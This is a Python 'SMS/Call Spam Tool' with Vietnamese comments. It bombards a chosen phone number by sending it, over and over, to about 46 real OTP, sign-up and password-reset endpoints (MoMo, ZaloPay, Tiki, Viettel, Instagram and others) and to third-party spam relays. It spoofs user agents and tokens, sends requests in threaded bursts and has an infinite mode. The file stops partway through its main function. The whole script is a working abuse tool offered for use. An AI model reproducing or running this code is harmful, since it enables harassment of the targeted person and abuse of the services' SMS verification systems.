#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SMS/Call Spam Tool - Phiên bản cải tiến
Thay thế input bằng tham số dòng lệnh và chạy vô hạn
"""

import requests
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import sys
import os
import json
import re
from urllib.parse import quote

# ========== CẤU HÌNH MÀU ==========
class Colors:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[1;34m'
    PURPLE = '\033[1;35m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'
    MAGIC = '\033[32;5;245m\033[1m\033[38;5;51m'
    RESET = '\033[0m'

# ========== BANNER ==========
def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""
{Colors.MAGIC}
  _______ ____   ____  _         _____ _____        __  __ 
 |__   __/ __ \ / __ \| |       / ____|  __ \ /\   |  \/  |
    | | | |  | | |  | | |      | (___ | |__) /  \  | \  / |
    | | | |  | | |  | | |       \___ \|  ___/ /\ \ | |\/| |
    | | | |__| | |__| | |____   ____) | |  / ____ \| |  | |
    |_|  \____/ \____/|______| |_____/|_| /_/    \_\_|  |_|
                                                           
{Colors.RED}────────────────────────────────────────────────────────────
{Colors.WHITE}[{Colors.CYAN}=.={Colors.WHITE}] {Colors.GREEN}TOOL SPAM CALL & SMS
{Colors.WHITE}[{Colors.CYAN}=.={Colors.WHITE}] {Colors.PURPLE}ADMIN: KhanhNguyen9872
{Colors.WHITE}[{Colors.CYAN}=.={Colors.WHITE}] {Colors.CYAN}ZALO: Unknown
{Colors.WHITE}[{Colors.CYAN}=.={Colors.WHITE}] {Colors.GREEN}Facebook: https://fb.me/khanh10a1
{Colors.WHITE}[{Colors.CYAN}=.={Colors.WHITE}] {Colors.YELLOW}README: Xin chao ban da den voi tool spam!
{Colors.RED}────────────────────────────────────────────────────────────
{Colors.RESET}
"""
    print(banner)

# ========== HÀM TIỆN ÍCH ==========
def random_string(length=10):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def random_hex(length=32):
    chars = "0123456789abcdef"
    return ''.join(random.choice(chars) for _ in range(length))

def get_time():
    return datetime.now().strftime("%H:%M:%S")

# ========== CÁC API SPAM ==========
def spam_zlpay(phone):
    """ZaloPay API"""
    try:
        url = "https://api.zalopay.vn/v2/account/phone/status"
        params = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
            'Host': 'api.zalopay.vn',
            'x-user-agent': 'iPhone8,2/iphone3x',
            'authorization': 'Bearer',
            'x-device-os': 'IOS',
            'x-drsite': 'off',
            'accept': '*/*',
            'x-app-version': '7.13.1',
            'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
            'x-platform': 'NATIVE',
            'x-os-version': '14.6'
        }
        r = requests.get(url, params=params, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] ZaloPay: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_momo(phone):
    """MoMo API"""
    try:
        url = "https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG"
        data = {
            "user": phone,
            "msgType": "SEND_OTP_MSG",
            "cmdId": "000000",
            "lang": "vi",
            "time": int(time.time() * 1000),
            "channel": "APP",
            "appVer": "3.1.6",
            "appCode": "3.1.6",
            "deviceOS": "ANDROID",
            "buildNumber": "20201010",
            "appId": "vn.momo.platform",
            "result": True,
            "errorCode": 0,
            "errorDesc": "",
            "momoMsg": {"class": "mservice.backend.entity.msg.RegDeviceMsg"},
            "extra": {"action": "SEND", "rkey": random_string(20)},
            "AAID": random_string(32),
            "IDFA": "",
            "TOKEN": random_string(32),
            "SIMULATOR": False,
            "SECUREID": random_string(32),
            "MODELID": "CPH1605",
            "isVoice": False,
            "REQUIRE_HASH_STRING_OTP": True,
            "checkSum": random_hex(32)
        }
        headers = {
            'User-Agent': 'okhttp/3.14.17',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] MoMo: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_vntrip(phone):
    """VnTrip API"""
    try:
        url = "https://micro-services.vntrip.vn/core-user-service/verification/request/phone"
        data = {"phone": phone}
        headers = {'User-Agent': 'Mozilla/5.0'}
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] VnTrip: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_pops(phone):
    """Pops API"""
    try:
        url = "https://products.popsww.com/api/v5/auths/register"
        data = {
            "fullName": random_string(8),
            "account": phone,
            "password": random_string(12),
            "confirmPassword": random_string(12)
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Pops: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_popeyes(phone):
    """Popeyes API"""
    try:
        url = "https://api.popeyes.vn/api/v1/register"
        data = {
            "firstName": random_string(5),
            "lastName": random_string(5),
            "email": f"{random_string(7)}@gmail.com",
            "phone": phone
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Popeyes: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_alfresco(phone):
    """Alfresco API"""
    try:
        url = "https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Alfresco: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_tv360(phone):
    """TV360 API"""
    try:
        url = "http://m.tv360.vn/public/v1/auth/get-otp-login"
        data = {"msisdn": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] TV360: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_tobi(phone):
    """Tobi API"""
    try:
        url = "https://tobizzx.xyz/tools/"
        data = {
            "ten_server": "server1",
            "key": "abc123",
            "phone": phone
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Tobi: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_loship(phone):
    """Loship API"""
    try:
        url = "https://latte.lozi.vn/v1.2/auth/register/phone/initial"
        data = {"phone": phone, "countryCode": "84"}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Loship: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_spamcallsms(phone):
    """SpamCallSMS Click API"""
    try:
        url = "https://spamcallsms.click/"
        data = {
            "api_key": "admin07ntt",
            "phone": phone,
            "option": "spam",
            "submit": "Submit"
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] SpamCallSMS: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_oldloship(phone):
    """Old Loship API"""
    try:
        url = "https://mocha.lozi.vn/v6/invites/use-app"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] OldLoship: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_fpt(phone):
    """FPT Shop API"""
    try:
        url = "https://fptshop.com.vn/api-data/loyalty/Home/Verification"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] FPT: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_kiotviet(phone):
    """KiotViet API"""
    try:
        url = "https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php"
        data = {
            "phone": phone,
            "code": random_string(6),
            "name": random_string(8),
            "zone": "Hanoi",
            "merchant": "Test",
            "username": random_string(6),
            "industry": "Retail",
            "ref_code": "",
            "industry_id": "1",
            "phone_input": phone
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] KiotViet: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_f88(phone):
    """F88 API"""
    try:
        url = "https://apigateway.f88.vn/services/appvay/api/onlinelending/VerifyOTP/sendOTP"
        data = {
            "phone": phone,
            "recaptchaResponse": "abc123",
            "source": "Online"
        }
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] F88: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_vayvnd(phone):
    """VayVND API"""
    try:
        url = "https://api.vayvnd.vn/v1/users/password-reset"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] VayVND: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_tamo(phone):
    """Tamo API"""
    try:
        url = "https://api.tamo.vn/web/public/client/phone/sms-code-ts"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Tamo: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_senmo(phone):
    """Senmo API"""
    try:
        url = "https://api.senmo.vn/api/user/send-one-time-password"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Senmo: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_atmonline(phone):
    """ATM Online API"""
    try:
        url = "https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] ATMOnline: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_thantaioi(phone):
    """Thân Tài Ơi API"""
    try:
        url = "https://api.thantaioi.vn/api/user/send-one-time-password"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] ThânTàiƠi: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_robocash(phone):
    """Robocash API"""
    try:
        url = "https://robocash.vn/register/phone-resend"
        data = {"_token": random_string(40), "phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Robocash: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_meta(phone):
    """Meta API"""
    try:
        url = f"https://howtospamsms.herokuapp.com/meta-vn?phone={phone}"
        r = requests.get(url, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Meta: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_vieon(phone):
    """VieOn API"""
    try:
        url = f"https://howtospamsms.herokuapp.com/vieon?phone={phone}"
        r = requests.get(url, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] VieOn: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_instagram(phone):
    """Instagram API"""
    try:
        url = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
        data = {
            "email_or_username": phone,
            "recaptcha_challenge_field": ""
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36',
            'x-csrftoken': random_string(32)
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Instagram: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_winmart(phone):
    """WinMart API"""
    try:
        url = f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}"
        r = requests.get(url, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] WinMart: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_concung(phone):
    """Con Cưng API"""
    try:
        url = "https://concung.com/ajax.html"
        data = {
            "ajax": "AjaxLogin",
            "classAjax": "sendOtpLogin",
            "methodAjax": "sendOtpLogin",
            "customer_phone": phone,
            "id_customer": "",
            "momoapp": "",
            "back": "khach-hang.html"
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] ConCung: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_daihocfpt(phone):
    """Đại học FPT API"""
    try:
        url = f"https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?resend_opt=1&mobile={phone}"
        r = requests.get(url, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] DaiHocFPT: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_cafeland(phone):
    """Cafeland API"""
    try:
        url = "https://nhadat.cafeland.vn/member-send-otp/"
        data = {"mobile": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Cafeland: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_dongplus(phone):
    """Dongplus API"""
    try:
        url = "https://api.dongplus.vn/api/user/send-one-time-password"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Dongplus: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_moneydong(phone):
    """MoneyDong API"""
    try:
        url = "https://api.moneydong.vip/h5/LoginMessage_ultimate"
        data = {"phone": phone, "ctype": "1", "chntoken": random_string(32)}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] MoneyDong: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_gotadi(phone):
    """Gotadi API"""
    try:
        url = "https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp"
        data = {"phone": phone, "language": "VI"}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Gotadi: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_funring(phone):
    """Funring API"""
    try:
        url = "http://funring.vn/api/v1.0.1/jersey/user/getotp"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Funring: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_oncredit(phone):
    """OnCredit API"""
    try:
        url = "https://oncredit.vn/?ajax"
        data = {
            "data[typeData]": "sendCodeReg",
            "data[phone]": phone,
            "data[email]": "test@gmail.com",
            "data[captcha1]": "1234",
            "data[lang]": "vi",
            "CSRFName": "csrf_token",
            "CSRFToken": random_string(32)
        }
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] OnCredit: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_fptplay(phone):
    """FPT Play API"""
    try:
        url = "https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=abc123&e=1681802671&device=Chrome&drm=1"
        data = {"phone": phone, "country_code": "VN", "client_id": "fptplay"}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] FPT Play: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_vietid(phone):
    """VietID API"""
    try:
        # Lấy CSRF token trước
        session = requests.Session()
        login_url = "https://oauth.vietid.net/rb/login"
        response = session.get(login_url, timeout=10)
        csrf_match = re.search(r'name="csrf-token" value="([^"]+)"', response.text)
        
        if csrf_match:
            csrf_token = csrf_match.group(1)
            url = "https://oauth.vietid.net/rb/authorize"
            params = {
                "client_id": "83958575a2421647",
                "response_type": "code",
                "redirect_uri": "https://enbac.com/member_login.php",
                "state": random_string(32),
                "phone": phone
            }
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'X-CSRF-TOKEN': csrf_token
            }
            r = session.post(url, params=params, headers=headers, timeout=10)
            print(f"{Colors.GREEN}[{get_time()}] VietID: {r.status_code}")
            return r.status_code == 200
        return False
    except:
        return False

def spam_ahamove(phone):
    """Ahamove API"""
    try:
        url = "https://api.ahamove.com/api/v3/public/user/register"
        data = {
            "phone": phone,
            "mail": f"{random_string(7)}@gmail.com",
            "name": "Tuấn",
            "firebase_sms_auth": True
        }
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Ahamove: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_vieon1(phone):
    """VieOn API v1"""
    try:
        url = "https://api.vieon.vn/backend/user/register/mobile"
        data = {
            "phone": phone,
            "given_name": "User",
            "device_id": random_string(32),
            "device_type": "mobile_web",
            "model": "RMX1919",
            "push_token": random_string(32),
            "device_name": "Android 10",
            "device_os": "Chrome/110"
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] VieOn1: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_tiki(phone):
    """Tiki API"""
    try:
        url = "https://tiki.vn/api/v2/customers/otp_codes"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Tiki: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_huykaiser(phone, count=100):
    """HuyKaiser API"""
    try:
        url = f"https://api.huykaiser.me/API/AUTOSPAM/spam?count={count}&phone={phone}"
        r = requests.get(url, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] HuyKaiser: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_moca(phone):
    """Moca API"""
    try:
        url = "https://moca.vn/moca/v2/users/registrations//verification"
        data = {"phone": phone, "registrationId": random_string(20)}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Moca: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_gpay(phone):
    """GPay API"""
    try:
        url = "https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone"
        data = {"phone": phone, "hash": random_string(40)}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] GPay: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_viettel(phone):
    """Viettel Telecom API"""
    try:
        url = "https://vietteltelecom.vn/api/get-otp-login"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Viettel: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_dkvt(phone):
    """Đăng ký Viettel API"""
    try:
        url = "https://viettel.vn/api/get-otp"
        data = {"phone": phone}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] DKViettel: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_tgdd(phone):
    """Thế Giới Di Động API"""
    try:
        url = "https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode"
        data = {
            "phone": phone,
            "isReSend": True,
            "sendOTPType": "SMS",
            "__RequestVerificationToken": random_string(64)
        }
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] TGDD: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_apiv2(phone):
    """API v2"""
    try:
        url = "https://onlytrislua.x10.mx/s/user-spam-sms.php"
        data = {"phone": phone, "server_id": "1", "api_key": "493"}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] APIv2: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_apiv3(phone):
    """API v3"""
    try:
        url = "https://onlytrislua.x10.mx/download/user-vip-spam-sms.php"
        data = {"phone": phone, "server_id": "2", "api_key": "493"}
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        r = requests.post(url, data=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] APIv3: {r.status_code}")
        return r.status_code == 200
    except:
        return False

def spam_callv10(phone):
    """Call v10 API"""
    try:
        url = "https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode"
        data = {
            "phone": phone,
            "password": "A123456789aT",
            "passwordConfirmation": "A123456789aT",
            "isVoiceSms": False
        }
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        }
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"{Colors.GREEN}[{get_time()}] Callv10: {r.status_code}")
        return r.status_code == 200
    except:
        return False

# ========== DANH SÁCH CÁC HÀM SPAM ==========
SPAM_FUNCTIONS = [
    spam_zlpay,
    spam_momo,
    spam_vntrip,
    spam_pops,
    spam_popeyes,
    spam_alfresco,
    spam_tv360,
    spam_tobi,
    spam_loship,
    spam_spamcallsms,
    spam_oldloship,
    spam_fpt,
    spam_kiotviet,
    spam_f88,
    spam_vayvnd,
    spam_tamo,
    spam_senmo,
    spam_atmonline,
    spam_thantaioi,
    spam_robocash,
    spam_meta,
    spam_vieon,
    spam_instagram,
    spam_winmart,
    spam_concung,
    spam_daihocfpt,
    spam_cafeland,
    spam_dongplus,
    spam_moneydong,
    spam_gotadi,
    spam_funring,
    spam_oncredit,
    spam_fptplay,
    spam_vietid,
    spam_ahamove,
    spam_vieon1,
    spam_tiki,
    spam_huykaiser,
    spam_moca,
    spam_gpay,
    spam_viettel,
    spam_dkvt,
    spam_tgdd,
    spam_apiv2,
    spam_apiv3,
    spam_callv10
]

# ========== HÀM CHÍNH ==========
def send_sms(phone, count):
    """Gửi SMS spam"""
    print(f"{Colors.CYAN}[{get_time()}] Bắt đầu spam số: {phone} với {count} lượt")
    
    successful = 0
    failed = 0
    
    for i in range(count):
        print(f"{Colors.YELLOW}[{get_time()}] Lượt {i+1}/{count}")
        
        # Chọn ngẫu nhiên một số API để gọi
        spam_func = random.choice(SPAM_FUNCTIONS)
        try:
            if spam_func(phone):
                successful += 1
            else:
                failed += 1
        except:
            failed += 1
        
        # Delay ngẫu nhiên giữa các request
        time.sleep(random.uniform(0.5, 2.0))
    
    print(f"{Colors.GREEN}[{get_time()}] Hoàn thành! Thành công: {successful}, Thất bại: {failed}")

def send_call(phone, count):
    """Gửi Call spam"""
    print(f"{Colors.CYAN}[{get_time()}] Bắt đầu spam call số: {phone} với {count} lượt")
    
    # Các API call (thực tế cần API thật cho call)
    call_apis = [
        spam_momo,
        spam_viettel,
        spam_fpt,
        spam_vieon
    ]
    
    successful = 0
    failed = 0
    
    for i in range(count):
        print(f"{Colors.YELLOW}[{get_time()}] Call lượt {i+1}/{count}")
        
        spam_func = random.choice(call_apis)
        try:
            if spam_func(phone):
                successful += 1
            else:
                failed += 1
        except:
            failed += 1
        
        time.sleep(random.uniform(1.0, 3.0))
    
    print(f"{Colors.GREEN}[{get_time()}] Hoàn thành call! Thành công: {successful}, Thất bại: {failed}")

def run_spam_v2(phone, count):
    """Chạy spam vô hạn"""
    print(f"{Colors.MAGIC}[{get_time()}] Chế độ vô hạn đang chạy cho số: {phone}")
    print(f"{Colors.YELLOW}Nhấn Ctrl+C để dừng{Colors.RESET}")
    
    iteration = 1
    while True:
        try:
            print(f"{Colors.CYAN}\n{'='*50}")
            print(f"{Colors.WHITE}Vòng lặp thứ: {iteration}")
            print(f"{Colors.CYAN}{'='*50}{Colors.RESET}")
            
            # Sử dụng ThreadPoolExecutor để chạy nhiều API cùng lúc
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for _ in range(min(count, 20)):  # Giới hạn 20 request mỗi vòng
                    spam_func = random.choice(SPAM_FUNCTIONS)
                    futures.append(executor.submit(spam_func, phone))
                
                # Đếm kết quả
                successful = sum(1 for f in futures if f.result(timeout=15) is True)
                failed = len(futures) - successful
            
            print(f"{Colors.GREEN}[{get_time()}] Vòng {iteration}: {successful}/{len(futures)} thành công")
            
            iteration += 1
            time.sleep(random.uniform(5.0, 10.0))  # Delay giữa các vòng
            
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[{get_time()}] Đã dừng bởi người dùng{Colors.RESET}")
            break
        except Exception as e:
            print(f"{Colors.RED}[{get_time()}] Lỗi: {e}{Colors.RESET}")
            time.sleep(5)

def main():
    # Hiển thị banner
    show_banner()
    
    # Kiểm tra tham số dòng lệnh
    if len(sys.argv) < 3:
        print(f"{Colors.RED}Usage: {sys.argv[0]} <phone_number> <count> [mode]")
        print(f"Modes: sms, call, infinite (default: sms)")
        print(f"Example: {sys.argv[0]} 0987654321 100 infinite")
        print(f"Example: {sys.argv[0]} 0987654321 50 sms{Colors.RESET}")
        sys.exit(1)
    
    # Lấy tham số từ command line
    phone = sys.argv[1]
    try:
        count = int(sys.argv[2])
    except ValueError:
        print(f"{Colors.RED}Count phải là số nguyên!{Colors.RESET}")
